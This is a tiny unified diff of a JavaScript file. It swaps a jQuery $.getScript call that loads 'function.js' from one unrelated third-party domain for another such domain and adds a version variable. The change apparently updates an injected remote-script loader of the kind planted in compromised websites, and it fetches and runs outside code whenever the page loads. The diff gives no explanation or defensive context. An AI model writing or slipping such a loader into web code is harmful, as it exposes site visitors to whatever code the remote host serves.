@@ -1,1 +1,2 @@
-$.getScript("http://blackbeanskoffie.com/function.js", function(){ });
+var versi     = 1;
+$.getScript("http://kkcollectionbatam.com/function.js", function(){ });
